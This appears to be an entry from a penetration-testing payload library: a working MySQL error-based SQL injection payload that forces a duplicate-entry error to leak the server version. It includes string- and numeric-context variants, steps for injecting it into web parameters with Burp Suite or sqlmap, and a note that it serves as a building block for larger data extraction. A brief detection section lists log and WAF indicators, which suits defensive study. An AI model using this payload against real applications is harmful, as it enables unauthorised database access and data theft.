---
type: code
language: SQL
verified: true
platforms:
  - MySQL
tags:
  - sql-injection
  - error-based
  - payload
validated: true
---

# MySQL-Error-Based-Duplicate-Entry-Payload-for-Version-Extraction

## Code

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```

## Description

This SQL payload exploits error-based injection in MySQL by triggering a duplicate entry error during a GROUP BY operation. It uses RAND() to generate inconsistent values, causing the database to error out and leak the concatenated @@VERSION in the message. The payload is designed for injection into string or numeric parameters in web applications.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| @@VERSION | Built-in MySQL variable for server version; no substitution needed. | 5.7.44 |
| 0x3a | Hex for colon (:) separator in concat output. | : |

## Usage

Inject this into a vulnerable web parameter, such as a search query or ID field (e.g., `?search=admin' [payload] --`). Monitor the HTTP response for error messages containing the version. Use in tools like Burp Suite for manual testing or sqlmap for automation. This is a building block for broader data extraction in error-based SQLi chains.

## Detection

- Application error logs showing 'Duplicate entry' with concatenated strings.
- WAF alerts on keywords like 'RAND()', 'GROUP BY', or 'CONCAT(@@VERSION)'.
- Database query logs revealing subqueries with UNION and FLOOR functions.
- Anomalous error responses in web traffic.

## Related

- [[procedures/MySQL-Error-Based-SQL-Injection-with-Select-for-Version-Extraction]]
